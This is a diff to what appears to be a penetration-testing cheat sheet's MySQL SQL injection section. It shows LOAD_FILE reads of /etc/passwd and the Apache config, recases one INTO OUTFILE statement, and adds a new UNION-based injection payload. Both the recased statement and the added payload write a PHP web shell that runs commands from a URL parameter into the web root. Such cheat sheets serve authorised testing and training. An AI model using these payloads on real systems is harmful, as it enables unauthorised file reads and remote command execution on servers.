@@ -1019,7 +1019,7 @@ SELECT LOAD_FILE('/etc/passwd')
 
 ```console
 LOAD_FILE('/etc/httpd/conf/httpd.conf')
-select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/<FILE>.php";
+SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/<FILE>.php";
 ```
 
 or
@@ -1027,6 +1027,12 @@ or
 ```console
 LOAD_FILE('/etc/httpd/conf/httpd.conf')
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/<FILE>.php" -- //
+```
+
+or
+
+```console
+' UNION SELECT 1,2,3,"<?php system($_GET['cmd']); ?>",5 INTO OUTFILE '/var/www/html/<FILE>.php'-- -
 ```
 
 #### MSSQL
